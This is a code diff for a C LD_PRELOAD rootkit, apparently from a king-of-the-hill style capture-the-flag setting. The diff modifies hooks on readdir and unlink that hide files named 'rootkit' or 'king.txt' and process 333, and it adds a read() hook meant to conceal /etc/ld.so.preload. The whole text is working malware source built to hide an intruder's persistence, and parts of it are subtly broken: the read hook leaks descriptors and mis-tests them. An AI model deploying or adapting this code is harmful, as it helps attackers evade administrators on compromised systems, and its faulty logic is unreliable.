@@ -9,6 +9,7 @@
 
 static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
 static int (*orig_unlink)(const char *pathname) = NULL;
+static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
 
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
@@ -17,8 +18,8 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-        // Hide files/directories containing "rootkit" or "king.txt" or "ld.so.preload"
-        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt" && strstr(entry->d_name, "ld.so.preload") == NULL) {
+        // Hide files/directories containing "rootkit" or "king.txt"
+        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt") == NULL) {
             // Hide process with a specific PID (e.g., 333)
             if (strcmp(entry->d_name, "333") == 0) {
                 continue;
@@ -39,10 +40,18 @@ int unlink(const char *pathname) {
         errno = EACCES;
         return -1;
     }
-    // Protect "/etc/ld.so.preload" from being deleted
-    if (strstr(pathname, "ld.so.preload") != NULL) {
-        errno = EACCES;
-        return -1;
-    }
     return orig_unlink(pathname);
+}
+
+ssize_t read(int fd, void *buf, size_t count) {
+    if (!orig_read) {
+        orig_read = dlsym(RTLD_NEXT, "read");
+    }
+
+    // Hide the content of /etc/ld.so.preload
+    if (fd == open("/etc/ld.so.preload", O_RDONLY)) {
+        return 0; // Return zero bytes to hide the content
+    }
+
+    return orig_read(fd, buf, count);
 }
